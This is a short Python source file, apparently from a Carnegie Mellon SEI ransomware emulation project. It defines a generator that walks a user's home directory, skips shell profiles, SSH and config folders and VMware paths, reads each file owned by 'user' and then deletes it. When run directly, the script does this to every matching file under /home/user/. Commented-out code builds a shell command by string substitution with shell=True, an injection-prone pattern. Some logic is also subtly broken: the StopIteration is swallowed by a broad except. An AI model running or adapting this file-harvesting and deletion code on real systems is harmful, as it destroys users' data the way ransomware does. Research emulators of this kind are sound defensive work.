
# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

#!/usr/bin/env python
import os,pwd

def discoverFiles(startpath, check_encrypt=False):
    '''
    Walk the path recursively down from startpath, and perform method on matching files.

    :startpath: a directory (preferably absolute) from which to start recursing down.
    :yield: a generator of filenames matching the conditions

    Notes:
        - no error checking is done. It is assumed the current user has rwx on
          every file and directory from the startpath down.

        - state is not kept. If this functions raises an Exception at any point,
          There is no way of knowing where to continue from.
    '''
    
    SPECIAL_FILES = [".bashr", ".zprofile", ".zlogin", ".X", ".ICE"]
    SPECIAL_DIRS = [".profile",".cache", ".config",".ssh",".rustup"]
    try:
        for cur_dir_abs_path, dir_in_cur_dir, files_in_cur_dir in os.walk(startpath):
            [dir_in_cur_dir.remove(folder) for folder in list(dir_in_cur_dir) if any(folder.startswith(spdir) for spdir in SPECIAL_DIRS)]
            [files_in_cur_dir.remove(filename) for filename in list(files_in_cur_dir) if any(filename.startswith(spfile) for spfile in SPECIAL_FILES)]
            for f in files_in_cur_dir:
                absolute_path = os.path.abspath(os.path.join(cur_dir_abs_path, f))
                try:
                    uid = os.stat(absolute_path).st_uid                                             #cmd = "ls -l cmd | awk '{print $3}'".replace('cmd',absolute_path)
                    if ('vmware' in str(absolute_path).lower()) or (pwd.getpwuid(uid).pw_name != 'user'):    # or (subprocess.run(cmd,shell=True,capture_output=True).stdout.decode('utf-8').strip('\n') != 'user'):
                        continue
                    if check_encrypt == True:
                        yield absolute_path
                        raise StopIteration
                    with open(absolute_path,'rb') as f:
                        content = f.read()
                except Exception as e:
                    continue
                else:
                    os.remove(absolute_path)
                    yield [absolute_path,content]
    except StopIteration:
        return

if __name__ == "__main__":
    for f in discoverFiles('/home/user/'):
        print(f[0])

